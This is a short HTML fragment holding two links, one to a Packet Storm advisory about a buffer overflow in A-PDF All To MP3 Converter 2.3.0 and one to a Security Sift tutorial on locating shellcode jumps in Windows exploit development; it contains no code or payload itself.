<p><a href="https://packetstormsecurity.com/files/118057/A-PDF-All-To-MP3-Converter-2.3.0-Buffer-Overflow.html">https://packetstormsecurity.com/files/118057/A-PDF-All-To-MP3-Converter-2.3.0-Buffer-Overflow.html</a></p>

<p><a href="https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/">https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/</a></p>
